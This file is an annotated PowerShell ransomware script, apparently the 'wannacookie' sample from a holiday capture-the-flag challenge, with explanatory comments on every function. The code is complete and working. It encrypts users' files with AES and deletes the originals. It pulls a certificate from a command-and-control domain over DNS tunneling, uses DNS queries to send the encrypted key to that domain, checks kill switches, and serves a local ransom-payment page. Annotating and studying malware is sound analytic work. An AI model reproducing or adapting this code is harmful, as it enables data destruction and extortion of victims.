$functions = {
    ###
    # Function to encrypt or decrypt a file. Creates the resulting ciphertext
    # or decrypted plaintext and deletes the original file.
    # Args:
    #   key - byte array representing key for encrypting/decrypting. Symmetric key for AES-128-CBC.
    #   File - filepath for file to encrypt/decrypt
    #   enc_it - boolean to determine whether or not to encrypt or decrypt the file.
    #          Value of $true means encrypt; value of $false means decrypt
    function e_d_file($key, $File, $enc_it) {
        [byte[]]$key = $key;

        # Encrypted files will have the .wannacookie extension
        $Suffix = "`.wannacookie";

        # (obsolete) load System.Security.Cryptography assembly
        [System.Reflection.Assembly]::LoadWithPartialName('System.Security.Cryptography');

        # Length of key in bits.
        [System.Int32]$KeySize = $key.Length*8;

        # Use AES (Advanced Encryption Standard) algorithm in CBC mode (128 bit blocks).
        $AESP = New-Object 'System.Security.Cryptography.AesManaged';
        $AESP.Mode = [System.Security.Cryptography.CipherMode]::CBC;
        $AESP.BlockSize = 128;
        $AESP.KeySize = $KeySize;
        $AESP.Key = $key;

        # Open specified file.
        $FileSR = New-Object System.IO.FileStream($File, [System.IO.FileMode]::Open);

        # If encrypted, add the `.wannacookie` suffix. Otherwise, if we're decrypting,
        # remove the `.wannacookie` suffix.
        if ($enc_it) {
            $DestFile = $File + $Suffix
        } else {
            $DestFile = ($File -replace $Suffix)
        };

        # Create a new file (either the encrypted version or the decrypted version).
        $FileSW = New-Object System.IO.FileStream($DestFile, [System.IO.FileMode]::Create);


        # Get ready to encrypt or decrypt the file. The first 4 bytes of the
        # ciphertext are reserved to indicate the length of the initialization vector (IV).
        # Either write or read in the IV for encrypting/decrypting.
        if ($enc_it) {
            # Since we're encrypting, generate an IV.
            $AESP.GenerateIV();

            # Write IV length at start of ciphertext, and then write the IV.
            $FileSW.Write([System.BitConverter]::GetBytes($AESP.IV.Length), 0, 4);
            $FileSW.Write($AESP.IV, 0, $AESP.IV.Length);

            # Prepare to encrypt using the established key and IV.
            $Transform = $AESP.CreateEncryptor()
        } else {
            # Prepare to decrypt the file. Read in the IV from ciphertext.
            [Byte[]]$LenIV = New-Object Byte[] 4;

            # IV starts at beginning of ciphertext.
            $FileSR.Seek(0, [System.IO.SeekOrigin]::Begin) | Out-Null;

            # Read in first 3 bytes of file to get the IV length.
            # In reality, the first 4 bytes are reserved for the IV length,
            # but since the IV for AES-CBC is going to be the same length as
            # a ciphertext block (in this case, 128-bits), the length
            # shouldn't take up more than 3 bytes.
            $FileSR.Read($LenIV,  0, 3) | Out-Null;

            # Convert IV length to integer.
            [Int]$LIV = [System.BitConverter]::ToInt32($LenIV,  0);

            # Create buffer for IV and read in the IV.
            [Byte[]]$IV = New-Object Byte[] $LIV;
            $FileSR.Seek(4, [System.IO.SeekOrigin]::Begin) | Out-Null;
            $FileSR.Read($IV, 0, $LIV) | Out-Null;
            $AESP.IV = $IV;

            # Prepare to decrypt using the established key and IV.
            $Transform = $AESP.CreateDecryptor()
        };

        # Create cryptography stream for writing to our destination file.
        $CryptoS = New-Object System.Security.Cryptography.CryptoStream($FileSW, $Transform, [System.Security.Cryptography.CryptoStreamMode]::Write);

        [Int]$Count = 0;

        # Block size in bytes. Should be 32 bytes for a 128-bit block size.
        [Int]$BlockSzBts = $AESP.BlockSize / 8;

        # Data buffer.
        [Byte[]]$Data = New-Object Byte[] $BlockSzBts;

        # Read in data from the origin file and either encrypt/decrypt it.
        Do {
            $Count = $FileSR.Read($Data, 0, $BlockSzBts);
            $CryptoS.Write($Data, 0, $Count)
        } While ($Count -gt 0);

        # Flush and close crypto stream and file streams.
        $CryptoS.FlushFinalBlock();
        $CryptoS.Close();
        $FileSR.Close();
        $FileSW.Close();

        # Delete data stored in the $key variable.
        Clear-variable -Name "key";

        # Delete originally specified file.
        Remove-Item $File
    }
};

###
# Converts the provided hex string into an array of the corresponding byte
# values. H2B = Hex to Byte
#
# Args:
#   HX - hex string to convert to byte array.
#
# Returns:
#   array of byte values of the hex string.
function H2B {
    param($HX);

    $HX = $HX -split '(..)' | ? { $_ };

    ForEach ($value in $HX){
        [Convert]::ToInt32($value,16)
    }
};

###
# Encodes a provided string into hex ASCII. A2H = ASCII to Hex
#
# Args:
#   a - string to convert into a hex string.
#
# Returns:
#   Uppercase hex string representing the hex encoding of the provided ASCII string.
function A2H(){
    Param($a);

    $c = '';
    $b = $a.ToCharArray();
    ;

    Foreach ($element in $b) {
        $c = $c + " " + [System.String]::Format("{0:X}", [System.Convert]::ToUInt32($element))
    };

    # Remove spaces before returning.
    return $c -replace ' '
};

###
# Decodes a provided hex ascii string into regular ascii. H2A = Hex to Ascii
#
# Args:
#   a - hex string to decode into regular ascii.
#
# Returns:
#   String representing the decoded hex string.
function H2A() {
    Param($a);

    $outa;

    # Split hex string into two-char pairs. Convert each pair of hex characters
    # to the corresponding integer value and then to the corresponding character
    # value.
    $a -split '(..)' | ? { $_ }  | forEach {[char]([convert]::toint16($_,16))} | forEach {$outa = $outa + $_};

    # Return decoded string.
    return $outa
};

###
# Takes a byte array and converts it into the corresponding hex string
# representation. B2H = Byte to Hex
#
# Args:
#   DEC - byte array to convert to hex.
#
# Returns:
#   lowercase hex string representing the byte array
function B2H {
    param($DEC);

    $tmp = '';
    ForEach ($value in $DEC){
        $a = "{0:x}" -f [Int]$value;
        if ($a.length -eq 1){
            $tmp += '0' + $a
        } else {
            $tmp += $a
        }
    };

    return $tmp
};

###
# bitwise XORs two hex ascii strings and returns the resulting byte array.
#
# Args:
#   b1 - first or two hex ascii strings to XOR
#   b2 - second of two hex ascii strings to XOR
#
# Returns:
#   byte array representing the bitwise XOR of the underlying binary
#   values of $b1 and $b2
function ti_rox {
    param($b1, $b2);

    # Convert args to binary.
    $b1 = $(H2B $b1);
    $b2 = $(H2B $b2);

    # Generate empty byte array buffer.
    $cont = New-Object Byte[] $b1.count;

    # bitwise XOR
    if ($b1.count -eq $b2.count) {
        for($i=0; $i -lt $b1.count ; $i++) {
            $cont[$i] = $b1[$i] -bxor $b2[$i]
        }
    };

    return $cont
};

###
# GZip-compresses data. B2G -> bytes to GZipped
#
# Args:
#   Data - byte array to GZip-compress
#
# Returns:
#   byte array containing the GZip-compressed data.
function B2G {
    param([byte[]]$Data);

    Process {
        $out = [System.IO.MemoryStream]::new();

        # Set up GZip stream to compress.
        $gStream = New-Object System.IO.Compression.GzipStream $out, ([IO.Compression.CompressionMode]::Compress);

        # Write compressed data to underlying memory stream.
        $gStream.Write($Data, 0, $Data.Length);
        $gStream.Close();

        # Return compressed data.
        return $out.ToArray()
    }
};

###
# GZip-decompresses data. G2B -> Gzipped to Bytes
#
# Args:
#   Data - byte array containing GZip-compressed data to decompress.
#
# Returns:
#   byte array containing the GZip-decompressed data.
function G2B {
    param([byte[]]$Data);

    Process {
        $SrcData = New-Object System.IO.MemoryStream( , $Data );
        $output = New-Object System.IO.MemoryStream;

        # Set up GZip stream for decompressing.
        $gStream = New-Object System.IO.Compression.GzipStream $SrcData, ([IO.Compression.CompressionMode]::Decompress);

        # Write decompressed bytes and return them as a byte array.
        $gStream.CopyTo( $output );
        $gStream.Close();
        $SrcData.Close();
        [byte[]] $byteArr = $output.ToArray();
        return $byteArr
    }
};

###
# Return hex-ascii string of the SHA1 hash of the specified string.
#
# Args:
#   String - string for which to generate SHA-1 hash
#
# Returns:
#   hex-ascii string of the SHA1 hash of the specified string.
function sh1([String] $String) {
    $SB = New-Object System.Text.StringBuilder;

    # Create SHA1 instance and generate SHA1 hash.
    [System.Security.Cryptography.HashAlgorithm]::Create("SHA1").ComputeHash([System.Text.Encoding]::UTF8.GetBytes($String))|%{[Void]$SB.Append($_.ToString("x2"))};
    $SB.ToString()
};

###
# Given a key and X.509 certificate data, encrypt the key with the certificate
# public key and return the hex encoding of the encrypted key. p_k_e = Public Key Encrypt.
#
# Args:
#   key_bytes - byte array representing key to encrypt
#   pub_bytes - byte array representing the X.509 certificate to use to encrypt $key_bytes
#
# Returns:
#   hex ascii representation of the encrypted key
function p_k_e($key_bytes, [byte[]]$pub_bytes){
    # Create new X.509 certificate object.
    $cert = New-Object -TypeName System.Security.Cryptography.X509Certificates.X509Certificate2;

    # Import cert info from arg.
    $cert.Import($pub_bytes);

    # Encrypt the key using the public key and return the hex encoding
    # of the ciphertext. Use OAEP padding.
    $encKey = $cert.PublicKey.Key.Encrypt($key_bytes, $true);

    return $(B2H $encKey)
};

###
# Encrypts or decrypts the specified files using the specified key.
# e_nd_ = Encrypt and Decrypt
#
# Args:
#   key - byte array representing key for encryption/decryption
#   allfiles - string array of file paths for files to encrypt/decrypt.
#   make_cookie - boolean to determine whether to encrypt ($true) or decrypt ($false)
function e_n_d {
    param($key, $allfiles, $make_cookie );

    $tcount = 12;

    # For each file to process, start a background job to encrypt or decrypt the file.
    for ( $file=0; $file -lt $allfiles.length; $file++  ) {
        while ($true) {
            # Get currently running jobs.  Don't allow more than 12 running jobs
            # at the same time.
            $running = @(Get-Job | Where-Object { $_.State -eq 'Running' });
            if ($running.Count -le $tcount) {
                # Start background job to encrypt/decrypt the file.
                Start-Job  -ScriptBlock {
                    param($key, $File, $true_false);
                    try{
                        # Encrypt or decrypt the current file.
                        e_d_file $key $File $true_false
                    } catch {
                        $_.Exception.Message | Out-String | Out-File $($env:userprofile+'\Desktop\ps_log.txt') -append
                    }
                } -args $key, $allfiles[$file], $make_cookie -InitializationScript $functions;
                break
            } else {
                # Wait for some currently running jobs to finish.
                Start-Sleep -m 200;
                continue
            }
        }
    }
};

###
# DNS tunneling function to obtain data from erohetfanu.com
#
# This function will perform a TXT DNS lookup for the specified subdomain of
# erohetfanu.com. The TXT response will be an integer, which determines the
# number of subsequent TXT requests to <integer>.<subdomain>.erohetfanu.com.
# Each of these subsequent lookups will provide information encoded as hex ascii,
# gets decoded and returned.
#
# g_o_dns is probably something like Get Object via DNS?
#
# Args:
#   f - String representing subdomain of erohetfanu.com to query.
#
# Returns:
#   ASCII string containing the resulting payload from the DNS tunneling transaction.
function g_o_dns($f) {
    $h = '';

    # Determine how many subsequent TXT queries to make for the DNS tunneling
    # in order to obtain all the data in the transaction.
    foreach ($i in 0..([convert]::ToInt32($(Resolve-DnsName -Server erohetfanu.com -Name "$f.erohetfanu.com" -Type TXT).Strings, 10)-1)) {
        $h += $(Resolve-DnsName -Server erohetfanu.com -Name "$i.$f.erohetfanu.com" -Type TXT).Strings
    };

    # Return the decoded data.
    return (H2A $h)
};

###
# Splits up a string into chunks specified by $size. s_2_c = String to Chunks
#
# Args:
#   astring - string to split up.
#   size - size of chunk.
#
# Returns:
#   array of strings representing the original string divided up into chunks of
#   the specified size.
function s_2_c($astring, $size=32) {
    $new_arr = @();
    $chunk_index=0;

    foreach($i in 1..$($astring.length / $size)) {
        $new_arr += @($astring.substring($chunk_index,$size));
        $chunk_index += $size
    };
    return $new_arr
};

###
# Use DNS tunneling to transmit the encrypted key for this victim to the C2 server.
# The server will assign an ID for the encrypted key, and the remainder of the key
# will be transmitted using this ID.  snd_k = "Send Key"
#
# Args:
#   enc_k - hex string of encrypted key to send.
#
# Returns:
#   ID (hex string) for the victim's key.
function snd_k($enc_k) {
    # Split hex string of encrypted key into substrings of size 32.
    $chunks = (s_2_c $enc_k );

    # Transmit key.
    foreach ($j in $chunks) {
        if ($chunks.IndexOf($j) -eq 0) {
            # "6B6579666F72626F746964" decodes to "keyforbotid"
            $n_c_id = $(Resolve-DnsName -Server erohetfanu.com -Name "$j.6B6579666F72626F746964.erohetfanu.com" -Type TXT).Strings
        } else {
            $(Resolve-DnsName -Server erohetfanu.com -Name "$n_c_id.$j.6B6579666F72626F746964.erohetfanu.com" -Type TXT).Strings
        }
    };

    return $n_c_id
};

###
# Main function.
#
# Check the kill switch conditions for early termination.
# Generate random 16-byte key for AES-128 encryption and encrypt the key
# Using a certificate from the c2 server.
# Encrypt target files, and run web server on local host to process the ransom
# and handle decryption if ransom is paid.
function wanc {
    $S1 = "1f8b080000000000040093e76762129765e2e1e6640f6361e7e202000cdd5c5c10000000";

    # Kill switch one - check if the secret domain resolves to an IP (i.e. it
    # has been registered). If so, exit prematurely.
    # $S1 gets decoded to its underlying byte values and then un-GZipped. The result,
    # "1f0f0202171d020c0b09075604070a0a", is XOR-ed with the DNS TXT lookup response
    # for "6B696C6C737769746368.erohetfanu.com".
    #
    # "6B696C6C737769746368" decodes to "killswitch", and the TXT lookup returns
    # "66667272727869657268667865666B73", which doesn't really decode to anything in ASCII
    # (after all, it's used to XOR against the un-GZipped $S1 data.  The XOR result
    # is "7969707065656b697961612e61616179", which decodes to "yippeekiyaa.aaay",
    # the killswitch domain. If this killswitch domain resolves, then
    # the malware exits early.
    if ($null -ne ((Resolve-DnsName -Name $(H2A $(B2H $(ti_rox $(B2H $(G2B $(H2B $S1))) $(Resolve-DnsName -Server erohetfanu.com -Name 6B696C6C737769746368.erohetfanu.com -Type TXT).Strings))).ToString() -ErrorAction 0 -Server 8.8.8.8))) {
        return
    };

    # Kill switch two - check if the system is not KringleCastle (the targeted
    # system) or if port 8080 is open on the localhost.
    # If either one is true, exit prematurely.
    if ($(netstat -ano | Select-String "127.0.0.1:8080").length -ne 0 -or (Get-WmiObject Win32_ComputerSystem).Domain -ne "KRINGLECASTLE") {
        return
    };

    # Returns byte array containing the decoded base64 data.
    # The hex ascii string decodes to "server.crt". Requesting this hex string
    # as a subdomain of erohetfanu.com will return "10", indicating that the
    # subsequent payload will be distributed in 10 TXT lookups of the form
    # 0.7365727665722E637274.erohetfanu.com, 1.7365727665722E637274.erohetfanu.com,
    # ... , 9.7365727665722E637274.erohetfanu.com.
    # The resulting payload is the following base-64 string:
    # MIIDXTCCAkWgAwIBAgIJAP6e19cw2sCjMA0GCSqGSIb3DQEBCwUAMEUxCzAJBgNVBAYTAkFVMRMwEQYDVQQIDApTb21lLVN0YXRlMSEwHwYDVQQKDBhJbnRlcm5ldCBXaWRnaXRzIFB0eSBMdGQwHhcNMTgwODAzMTUwMTA3WhcNMTkwODAzMTUwMTA3WjBFMQswCQYDVQQGEwJBVTETMBEGA1UECAwKU29tZS1TdGF0ZTEhMB8GA1UECgwYSW50ZXJuZXQgV2lkZ2l0cyBQdHkgTHRkMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAxIjc2VVG1wmzBi+LDNlLYpUeLHhGZYtgjKAye96h6pfrUqcLSvcuC+s5ywy1kgOrrx/pZh4YXqfbolt77x2AqvjGuRJYwa78EMtHtgq/6njQa3TLULPSpMTCQM9H0SWF77VgDRSReQPjaoyPo3TFbS/Pj1ThlqdTwPA0lu4vvXi5Kj2zQ8QnxYQBhpRxFPnB9Ak6G9EgeR5NEkz1CiiVXN37A/P7etMiU4QsOBipEcBvL6nEAoABlUHizWCTBBb9PlhwLdlsY1k7tx5wHzD7IhJ5P8tdksBzgrWjYxUfBreddg+4nRVVuKebE9Jq6zImCfu8elXjCJK8OLZP9WZWDQIDAQABo1AwTjAdBgNVHQ4EFgQUfeOgZ4f+kxU1/BN/PpHRuzBYzdEwHwYDVR0jBBgwFoAUfeOgZ4f+kxU1/BN/PpHRuzBYzdEwDAYDVR0TBAUwAwEB/zANBgkqhkiG9w0BAQsFAAOCAQEAhdhDHQvW9Q+Fromk7n2G2eXkTNX1bxz2PS2Q1ZW393Z83aBRWRvQKt/qGCAi9AHg+NB/F0WMZfuuLgziJQTHQS+vvCn3bi1HCwz9w7PFe5CZegaivbaRD0h7V9RHwVfzCGSddUEGBH3j8q7thrKOxOmEwvHi/0ar+0sscBideOGq11hoTn74I+gHjRherRvQWJb4Abfdr4kUnAsdxsl7MTxM0f4t4cdWHyeJUH3yBuT6euId9rn7GQNi61HjChXjEfza8hpBC4OurCKcfQiVoY/0BxXdxgTygwhAdWmvNrHPoQyB5Q9XwgN/wWMtrlPZfy3AW9uGFj/sgJv42xcF+w==
    #
    # Decode the base64 payload, which is DER-encoded data for an X.509 certificate.
    # Place into byte array $p_k.
    $p_k = [System.Convert]::FromBase64String($(g_o_dns("7365727665722E637274") ) );

    # Generate 16 random bytes for our key, and make sure we don't have get 0x0.
    $b_k = ([System.Text.Encoding]::Unicode.GetBytes($(([char[]]([char]01..[char]255) + ([char[]]([char]01..[char]255)) + 0..9 | sort {Get-Random})[0..15] -join ''))  | ? {$_ -ne 0x00});

    # Get hex representation of the 16-byte random key.
    $h_k = $(B2H $b_k);

    # Get SHA1 hash of the hex key.
    $k_h = $(sh1 $h_k);

    # Encrypt our 16-byte key with the cert, and get the hex representation
    # of the encrypted key.  512-length hex string, for 256 bytes (2048 bit).
    $p_k_e_k = (p_k_e $b_k $p_k).ToString();

    # Send encrypted key to server and obtain ID for this victim's key.
    $c_id = (snd_k $p_k_e_k);

    # Get String representing current date and time.
    # e.g. "Tuesday, January 1, 2019 12:34:56 AM"
    $d_t = (($(Get-Date).ToUniversalTime() | Out-String) -replace "`r`n");

    # Searching recursively through the directories specified by the -Path option,
    # look for .elfdb files and ignore .wannacookie files (those that have already
    # been encrypted).  Grab the full filepaths of the .elfdb files (as long as
    # they aren't directories), and store them in $f_c as a string array.
    [array]$f_c = $(Get-ChildItem *.elfdb -Exclude *.wannacookie -Path $($($env:userprofile+'\Desktop'),$($env:userprofile+'\Documents'),$($env:userprofile+'\Videos'),$($env:userprofile+'\Pictures'),$($env:userprofile+'\Music')) -Recurse | where { ! $_.PSIsContainer } | Foreach-Object {$_.Fullname});

    # Encrypt the .elfdb files using the key.
    e_n_d $b_k $f_c $true;

    # Delete plaintext key information.
    Clear-variable -Name "h_k";
    Clear-variable -Name "b_k";

    $lurl = 'http://127.0.0.1:8080/';

    # Hash table for HTML responses for various HTTP requests.
    $html_c = @{
        'GET /'  =  $(g_o_dns (A2H "source.min.html"));
        'GET /close'  =  '<p>Bye!</p>'
    };

    Start-Job -ScriptBlock{
        param($url);
        Start-Sleep 10;

        # Import System.Windows.Forms class.
        Add-type -AssemblyName System.Windows.Forms;

        # Open up "http://127.0.0.1:8080/" in max-window browser.
        start-process "$url" -WindowStyle Maximized;
        Start-sleep 2;

        # Send the "F11" key to the application and wait for the response.
        [System.Windows.Forms.SendKeys]::SendWait("{F11}")
    } -Arg $lurl;

    # Create and start HTTP server for localhost:8080
    $list = New-Object System.Net.HttpListener;
    $list.Prefixes.Add($lurl);
    $list.Start();

    try {
        $close = $false;
        while ($list.IsListening) {
            # Wait for request.
            $context = $list.GetContext();

            # Get HttpListenerRequest and HttpListenerResponse objects.
            $Req = $context.Request;
            $Resp = $context.Response;

            # Get HTTP method and requested file path (e.g. GET /)
            $recvd = '{0} {1}' -f $Req.httpmethod, $Req.url.localpath;

            if ($recvd -eq 'GET /') {
                # Use home page stored in the hash table.
                $html = $html_c[$recvd]
            } elseif ($recvd -eq 'GET /decrypt') {
                # Get "key" value from URL parameter.
                $akey = $Req.QueryString.Item("key");

                # Check if the submitted key matches the key used to encrypt
                # the files by comparing SHA-1 hash values.
                if ($k_h -eq $(sh1 $akey)) {
                    $akey = $(H2B $akey);

                    # Get the full filepaths of the encrypted
                    # files (with the .wannacookie extension).
                    [array]$f_c = $(Get-ChildItem -Path $($env:userprofile) -Recurse  -Filter *.wannacookie | where { ! $_.PSIsContainer } | Foreach-Object {$_.Fullname});

                    # Decrypt the encrypted files.
                    e_n_d $akey $f_c $false;
                    $html = "Files have been decrypted!";
                    $close = $true
                } else {
                    $html = "Invalid Key!"
                }
            } elseif ($recvd -eq 'GET /close') {
                # Exit.
                $close = $true;
                $html = $html_c[$recvd]
            } elseif ($recvd -eq 'GET /cookie_is_paid') {
                # Check if the ransom has been paid or not by requesting
                # the unique subdomain for the previously generated key ID.
                # "72616e736f6d697370616964" decodes to "ransomispaid",
                # which is the erohetfanu.com subdomain that handles these
                # DNS tunneling transactions. The response from the c2 server
                # will indicate whether or not the ransom was paid.
                $c_n_k = $(Resolve-DnsName -Server erohetfanu.com -Name ("$c_id.72616e736f6d697370616964.erohetfanu.com".trim()) -Type TXT).Strings;

                if ( $c_n_k.length -eq 32 ) {
                    $html = $c_n_k
                } else {
                    $html = "UNPAID|$c_id|$d_t"
                }
            } else {
                $Resp.statuscode = 404;
                $html = '<h1>404 Not Found</h1>'
            };

            # Send the appropriate HTML response.
            $buffer = [Text.Encoding]::UTF8.GetBytes($html);
            $Resp.ContentLength64 = $buffer.length;
            $Resp.OutputStream.Write($buffer, 0, $buffer.length);
            $Resp.Close();

            # Check if we need to stop.
            if ($close) {
                $list.Stop();
                return
            }
        }
    } finally {
        $list.Stop()
    }
};

# Run the main function.
wanc;
